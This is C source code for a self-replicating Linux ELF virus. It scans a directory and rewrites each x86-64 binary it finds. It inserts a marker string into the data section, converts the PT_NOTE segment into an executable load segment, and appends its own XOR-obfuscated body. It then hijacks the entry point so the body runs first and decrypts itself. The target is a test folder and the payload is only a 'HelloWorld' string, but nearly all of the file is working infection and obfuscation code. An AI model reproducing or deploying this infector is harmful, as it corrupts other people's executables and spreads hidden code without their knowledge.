static void  start(void) {}
#define _FCNTL_H
#define _SYS_MMAN_H
#include <linux/stat.h>
#include <stddef.h>
#include <sys/types.h>
#include <bits/stat.h>
#include <bits/fcntl.h>
#include <bits/mman.h>
#include <stdio.h>
#include <signal.h>
#include <dirent.h>
#include <elf.h>

#define BUF_SIZE 1024 * 1024 * 5
#define PAYLOAD "HelloWorld"
#define MAP_FAILED	((void *) -1)

static void end(void);
static void lambdaEnd(void);
static void lambdaStart(void);
static void encryptStart(void);
static size_t strlen(const char *s);
static int  infectBins(const char *dirname);
static void *memcpy(void *dest, const void *src, size_t);
static int unObfuscate(void);

int   entry_point(void *magic) {
  char    infectDir[] = "/tmp/test";
  char    infectDir2[] = "/tmp/test2";

  if (magic != (void *)0x42)
    if (unObfuscate() == -1)
      return (1);
  if (infectBins(infectDir) == -1)
    return (1);
  /* if (infectBins(infectDir2) == -1) */
  /*   return (1); */
  if (magic == (void *)0x42)
    return (0);
  register int8_t rax2 asm("rax") = 0;
  register int8_t rbx2 asm("rbx") = 0;
  register int8_t rcx2 asm("rcx") = 0;
  register int8_t rdx2 asm("rdx") = 0;
  register int8_t rsi2 asm("rsi") = 0;
  register int8_t rdi2 asm("rdi") = 0;
  register int8_t r82 asm("r8") = 0;
  register int8_t r92 asm("r9") = 0;
  register int8_t r102 asm("r10") = 0;
  register int8_t r112 asm("r11") = 0;
  register int8_t r122 asm("r12") = 0;
  register int8_t r132 asm("r13") = 0;
  register int8_t r142 asm("r14") = 0;
  register int8_t r152 asm("r15") = 0;
  asm("jmp endSC");
}

static int  mprotect(void *addr, size_t len, int prot) {
  register int    rax asm("rax") = 10;
  register void   *rdi asm("rdi") = addr;
  register size_t rsi asm("rsi") = len;
  register int    rdx asm("rdx") = prot;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static void *align(size_t value) {
  return (void *)(((value + (4096 - 1)) & -4096) - 4096);
}

static int unObfuscate(void) {
  size_t  i;
  size_t  size;
  char    *code;
  void    *aligned;

  size = ((void *)end) - ((void *)encryptStart);
  aligned = align((size_t)encryptStart);
  if (mprotect(aligned, size + ((void *)encryptStart - aligned), PROT_WRITE | PROT_EXEC | PROT_READ) < 0)
    return (-1);
  i = 0;
  code = (void *)encryptStart;
  while (i < size) {
    code[i] ^= 0xa5;
    i += 1;
  }
  if (mprotect(aligned, size + ((void *)encryptStart - aligned), PROT_EXEC | PROT_READ) < 0)
    return (-1);
  return (0);
}

static void encryptStart(void) {}
typedef off_t off64_t;
typedef ino_t ino64_t;

struct  linux_dirent {
  unsigned long         d_ino;
  unsigned long         d_off;
  unsigned short        d_reclen;
  char                  d_name[];
};
static int  write(int fd, const void *buf, size_t count) {
  register int        rax asm("rax") = 1;
  register int        rdi asm("rdi") = fd;
  register const void *rsi asm("rsi") = buf;
  register size_t     rdx asm("rdx") = count;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static int  open(const char *pathname, int flags, int mode) {
  register int        rax asm("rax") = 2; register const char *rdi asm("rdi") = pathname;
  register int        rsi asm("rsi") = flags;
  register int        rdx asm("rdx") = mode;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static int  close(int fd) {
  register int          rax asm("rax") = 3;
  register unsigned int rdi asm("rdi") = fd;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static int  stat(const char *filename, struct stat *statbuf) {
  register int          rax asm("rax") = 4;
  register const char   *rdi asm("rdi") = filename;
  register struct stat  *rsi asm("rsi") = statbuf;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off) {
  register void         *ret asm("rax");
  register int8_t       rax asm("rax") = 9;
  register void   *rdi asm("rdi") = addr;
  register size_t rsi asm("rsi") = len;
  register int    rdx asm("rdx") = prot;
  register int    r10 asm("r10") = flags;
  register int    r8 asm("r8") = fildes;
  register off_t  r9 asm("r9") = off;

  asm("syscall"
    : "=r" (ret));
  return (ret);
}

static int  munmap(void *addr, size_t len) {
  register int    rax asm("rax") = 11;
  register void   *rdi asm("rdi") = addr;
  register size_t rsi asm("rsi") = len;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static int  getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
  register int                    rax asm("rax") = 78;
  register unsigned int           rdi asm("rdi") = fd;
  register struct linux_dirent  *rsi asm("rsi") = dirp;
  register unsigned int           rdx asm("rdx") = count;

  asm("syscall"
    : "=r" (rax));
  return (rax);
}

static void *memcpy(void *dest, const void *src, size_t n) {
  while (n != 0) {
    n -= 1;
    ((char *)dest)[n] = ((char *)src)[n];
  }
  return (dest);
}

static char *strcat(char *dest, const char *src) {
  int i;
  int j;

  i = 0;
  while (dest[i])
    i += 1;
  j = 0;
  while (src[j]) {
    dest[i] = src[j];
    i += 1;
    j += 1;
  }
  dest[i] = '\0';
  return (dest);
}

static size_t strlen(const char *s) {
  size_t  i;

  i = 0;
  while (s[i])
    i += 1;
  return (i);
}

static int strcmp(const char *s1, const char *s2) {
  size_t  i;

  i = 0;
  while (s1[i] && s2[i]) {
    if (s1[i] != s2[i])
      return (s1[i] - s2[i]);
    i += 1;
  }
  return (s1[i] - s2[i]);
}

static void *memset(void *s, int c, size_t n) {
  while (n != 0) {
    n -= 1;
    ((char *)s)[n] = c;
  }
  return (s);
}

static void  *memmove(void *dest, const void *src, size_t n) {
  if (src >= dest)
    memcpy(dest, src, n);
  else {
    while (n != 0) {
      n -= 1;
      ((char *)dest)[n] = ((char *)src)[n];
    }
  }
  return (dest);
}

/* static DIR *opendir(const char *name) { */

/* } */

/* static struct dirent  *readdir(DIR *dirp) { */

/* } */

/* static int  closedir(DIR *dirp) { */

/* } */

struct bfile {
  int         fd;
  off_t       size;
  Elf64_Ehdr  *header;
};

#include <string.h>

static int  mapFile(const char *dirname, const char *filename, struct bfile *bin) {
  int         fd;
  size_t      len;
  char        *tmp;
  char        slash[] = "/";
  struct stat stats;

  len = strlen(dirname) + strlen(filename) + 2;
  if ((tmp = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)) <= 0)
    return (-1);
  memcpy(tmp, dirname, strlen(dirname));
  strcat(tmp, slash);
  strcat(tmp, filename);
  if (stat(tmp, &stats) < 0) {
    munmap(tmp, len);
    return (-1);
  }
  if (!S_ISREG(stats.st_mode)) {
    munmap(tmp, len);
    return (1);
  }
  if ((fd = open(tmp, O_RDWR, 0)) <= 0) {
    munmap(tmp, len);
    return (-1);
  }
  if ((bin->header = mmap(0, stats.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
    close(fd);
    munmap(tmp, len);
    return (-1);
  }
  munmap(tmp, len);
  bin->fd = fd;
  bin->size = stats.st_size;
  return (0);
}

static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
    size_t      i;
    Elf64_Shdr  *section;
    Elf64_Phdr  *program;

    if (header->e_entry > offset)
      header->e_entry += toAdd;
    if (header->e_phoff > offset)
      header->e_phoff += toAdd;
    if (header->e_shoff > offset)
      header->e_shoff += toAdd;
    i = 0;
    while (i < header->e_shnum) {
        section = ((void *)header) + header->e_shoff + i * sizeof(Elf64_Shdr);
        if (section->sh_offset >= offset)
            section->sh_offset += toAdd;
        i += 1;
    }
    i = 0;
    while (i < header->e_phnum) {
        program = ((void *)header) + header->e_phoff + i * sizeof(Elf64_Phdr);
        if (program->p_offset >= offset)
            program->p_offset += toAdd;
        if (program->p_paddr >= offset)
            program->p_paddr += toAdd;
        i += 1;
    }
}

static Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
  Elf64_Shdr  *pointer;
  Elf64_Shdr  *shstrHeader;
  char        dataName[] = ".data";

  pointer = ((void *)header) + header->e_shoff;
  shstrHeader = ((void *)header) + header->e_shoff + sizeof(Elf64_Shdr) * header->e_shstrndx;
  while (strcmp(((void *)header) + shstrHeader->sh_offset + pointer->sh_name, dataName) != 0)
    pointer += 1;
  return (pointer);
}

static void  appendSignature(struct bfile file, size_t offset) {
  size_t  toAdd;

  char payload[] = PAYLOAD;
  toAdd = strlen(payload) + 1;
  memmove(((void *)file.header) + offset + toAdd, ((void *)file.header) + offset, file.size - offset);
  memcpy(((void *)file.header) + offset, payload, toAdd);
}

static void obfuscate(char *header, size_t size) {
  size_t  i;

  i = 0;
  while (i < size) {
    header[i] ^= 0xa5;
    i += 1;
  }
}

static int  appendShellcode(struct bfile *bin) {
  size_t  size;
  char    ins[5];
  size_t  address;
  struct bfile  new;

  size = end - start + (lambdaEnd - lambdaStart);
  new.size = bin->size + size + 5;
  if ((new.header = mmap(NULL, new.size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
    return (-1);
  memcpy(new.header, bin->header, bin->size);
  memcpy(((void *)new.header) + bin->size, start, size);
  obfuscate(((void *)new.header) + bin->size + (encryptStart - start), end - encryptStart);
  address = -(0xc000000 + bin->size - bin->header->e_entry + size + 5);
  ins[0] = 0xe9;
  ins[1] = (address >> 0) & 0xff;
  ins[2] = (address >> 8) & 0xff;
  ins[3] = (address >> 16) & 0xff;
  ins[4] = (address >> 24) & 0xff;
  memcpy(((void *)new.header) + bin->size + size, ins, 5);
  munmap(bin->header, bin->size);
  bin->header = new.header;
  bin->size = new.size;
  return (0);
}

static int  appendCode(struct bfile *bin) {
  size_t      size;
  Elf64_Phdr  *segment;

  if (appendShellcode(bin) == -1)
    return (-1);
  size = end - start + 5;
  segment = ((void *)bin->header) + bin->header->e_phoff;
  while (segment->p_type != PT_NOTE)
    segment += 1;
  segment->p_flags = PF_R | PF_X;
  segment->p_type = PT_LOAD;
  segment->p_offset = bin->size - size;
  segment->p_vaddr = 0xc000000 + bin->size - size;
  segment->p_paddr = bin->size - size;
  segment->p_filesz = size;
  segment->p_memsz = size;
  bin->header->e_entry = 0xc000000 + bin->size - size;
  return (0);
  
}

static int  infectFile(struct bfile bin) {
  size_t      len;
  size_t      size;
  Elf64_Phdr  *seg;
  Elf64_Shdr  *data;
  Elf64_Off   offset;

  char payload[] = PAYLOAD;
  len = strlen(payload);
  data = getDataSectionHeader(bin.header);
  offset = data->sh_offset;
  size = data->sh_size;
  appendSignature(bin, offset + size);
  updateOffsets(bin.header, offset + size, len + 1);
  data = getDataSectionHeader(bin.header);
  seg = ((void *)bin.header) + bin.header->e_phoff;
  while (seg != ((void *)bin.header) + bin.header->e_phoff + bin.header->e_phnum * sizeof(Elf64_Phdr)) {
    if (seg->p_offset <= data->sh_offset &&
      seg->p_offset + seg->p_filesz >= data->sh_offset + data->sh_size) {
      seg->p_filesz += strlen(payload) + 1;
      seg->p_memsz += strlen(payload) + 1;
    }
    seg += 1;
  }
  data->sh_size += strlen(payload) + 1;
  bin.size += len + 1;
  if (appendCode(&bin) == -1)
    return (-1);
  write(bin.fd, bin.header, bin.size);
  close(bin.fd);
  munmap(bin.header, bin.size);
}

static int  isCompatible(unsigned char e_ident[EI_NIDENT], Elf64_Half e_machine) {
  return (e_ident[EI_MAG0] == ELFMAG0 &&
          e_ident[EI_MAG1] == ELFMAG1 &&
          e_ident[EI_MAG2] == ELFMAG2 &&
          e_ident[EI_MAG3] == ELFMAG3 &&
          e_machine == EM_X86_64);
}

static int  infectBins(const char *dirname) {
  int                   fd;
  int                   ret;
  struct bfile          bin;
  int                   bpos;
  int                   nread;
  struct linux_dirent   *dirp;
  char                  buf[BUF_SIZE];
  char                  d_type;

  if ((fd = open(dirname, O_RDONLY | O_DIRECTORY, 0)) < 0)
    return (-1);
  if ((nread = getdents(fd, (struct linux_dirent *)buf, BUF_SIZE)) < 0)
    return (-1);
  bpos = 0;
  while (bpos < nread) {
    dirp = (struct linux_dirent *) (buf + bpos);
    if ((ret = mapFile(dirname, dirp->d_name, &bin)) == -1)
      return (-1);
    if (ret == 0 &&
      bin.size >= sizeof(Elf64_Ehdr) &&
      isCompatible(bin.header->e_ident, bin.header->e_machine))
      if (infectFile(bin) == -1)
        return (-1);
    bpos += dirp->d_reclen;
  }
  close(fd);
  return (0);
}

static void   lambdaStart(void) {}
static void   lambdaEnd(void) {}

static void   end(void) {}
asm("endSC:");
